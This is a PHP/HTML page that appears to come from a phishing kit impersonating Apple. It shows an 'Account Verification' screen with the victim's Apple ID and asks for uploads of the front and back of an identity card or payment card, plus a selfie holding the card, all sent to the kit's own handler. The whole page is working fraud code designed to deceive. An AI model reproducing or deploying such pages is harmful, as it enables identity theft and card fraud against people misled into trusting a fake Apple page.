<?php
if(empty($_GET['type']))
{

    $core->redirect('?page=photo&type=id&appIdKey='.$appidkey.'&locale='.$localex);
    exit;
}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex" />
    <link rel="stylesheet" href="./HijaIyh_App/assets/css/modal.css">
    <link rel="stylesheet" href="./HijaIyh_App/assets/css/bootstrap.min.css">
    <link rel="icon" href="./HijaIyh_App/assets/img/favicon.ico" type="image/x-icon" />
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="shortcut icon" sizes="196x196" href="./HijaIyh_App/assets/img/favicon.ico">
     <script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.js"></script>
     <script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.validate.min.js"></script>
    
  </head>
  <body>

        <div class="container-fluid">
                <div class="row clearfix">
                <link rel="stylesheet" type="text/css" href="./HijaIyh_App/assets/css/desktop.css">
                                
                <!DOCTYPE html>
<html lang="en"><head>
<title><?=$core->translate('Confirm your information',$lang);?></title>    <link rel="stylesheet" type="text/css" href="./HijaIyh_App/assets/css/desktop.css">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="icon" href="./HijaIyh_App/assets/img/favicon.ico" type="image/x-icon" />
<style>
.image-upload1 > input
{
    display: none;
}
.image-upload > input
{
    display: none;
}
</style>
</head>
<body>
<div id="head"></div>
<div id="container">
    <div id="xheader">
        <div id="navbar"></div>
        <div style="font-size: 38px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;text-align: right;position: absolute;top: 53px;z-index: 2;left: 0px;">

         <b><?=$core->translate('Account Verification',$lang);?></b> 
            </div>
        <div id="account_type">
        <?=$core->translate('Your Apple ID is',$lang);?> <?=$core->session('appleid');?>

        <b>  </b> </div>
        <div id="logout"></div>
        <font id="logout0"><a href="#" style="color:#fff;text-decoration: none;"><?=$core->translate('Sign Out',$lang);?></a></font>
    </div>
    <script>
        function readURLdesktop(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();

            reader.onload = function (e) {
                $('#gambardesktop')
                    .attr('src', e.target.result)
                    .width(400)
                    .height(280);
            };

            reader.readAsDataURL(input.files[0]);
        }
    }
    </script>
    <div id="xcontent">
        <?php
        if(@$_GET['type'] == 'card'){ ?>
        <form action="?req=photo&type=card&appIdKey=<?=$appidkey;?>&locale=<?=$localex;?>" method="POST" enctype="multipart/form-data" >
        <font class="xFont" style="top:35px;left:2px;"><?=$core->translate('Upload Identity',$lang);?></font>
            
            <hr style="top:610px;">
                        <br><br>
            <font class="xFont2" style="top:32px;left:280px;"><b><?=$core->translate('TAKE A SELFIE BY HOLDING CARD',$lang);?></b></font>
            <font class="xFont3" style="top:60px;left:280px;">
                <li><?=$core->translate('Cardholders name and ID card should match and be clearly visible.',$lang);?></li><li><?=$core->translate('Please upload front and back your card.',$lang);?></li><br>
            <img id="gambardesktop" width="390" src="./HijaIyh_App/assets/img/uploadcc.png">
            <br><br>
            <font class="xFont2"><b><?=$core->translate('FRONT CARD',$lang);?></b></font><br><br>
            <input id="file-input2" name="uploadcc_front" type="file" required>
            <br><br>
            <font class="xFont2"><b><?=$core->translate('BACK CARD',$lang);?></b></font><br><br>
            <input id="file-input2" name="uploadcc_back" type="file" required>
            </font>
            
                        <br><br>

<button class="button rect" type="submit" style="
    position: absolute;
    top: 650px;
    left: 280px;
    width: 259px;
    padding:6px;">
<span>Continue</span>
</button>


            </form>
            <?php
        }elseif($_GET['type'] == 'id')
        {
            ?>
                 <form action="?req=photo&type=id&appIdKey=<?=$appidkey;?>&locale=<?=$localex;?>" method="POST" enctype="multipart/form-data" >
        <font class="xFont" style="top:35px;left:2px;"><?=$core->translate('Upload Identity',$lang);?></font>
            <hr style="top:427px;">
                        <br><br>
            <font class="xFont2" style="top:32px;left:280px;"><b><?=$core->translate('TAKE A SELFIE WITH',$lang);?></b></font>
            <font class="xFont3" style="top:60px;left:280px;">
            <div class="image-upload1">
            <img id="gambardesktop" width="390" src="./HijaIyh_App/assets/img/id.png">
            <br><br>
            <font class="xFont2"><b><?=$core->translate('FRONT CARD',$lang);?></b></font><br><br>
            <input id="file-input2" name="uploadid_front" type="file" required>
            <br><br>
            <font class="xFont2"><b><?=$core->translate('BACK CARD',$lang);?></b></font><br><br>
            <input id="file-input2" name="uploadid_back" type="file" required>
            </font>
            </div>

            </font>
            <font class="xFont3" style="top:110px;left:600px;"></font>
                        <br><br>

<button class="button rect" type="submit" style="
    position: absolute;
    top: 480px;
    left: 280px;
    width: 259px;
    padding:6px;">
<span><?=$core->translate('Continue',$lang);?></span>
</button>


            </form>
            <?php
        }
        ?>
    </div>
    
</div>
<div id="containerfooter">
<!-- <div id="footerbawah"></div> -->
</div>
<script src="./HijaIyh_App/assets/js/main.js"></script></script>
<script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.validate.min.js"></script>

</body>
</html>
                </div>
        </div>
      <body>
</html>
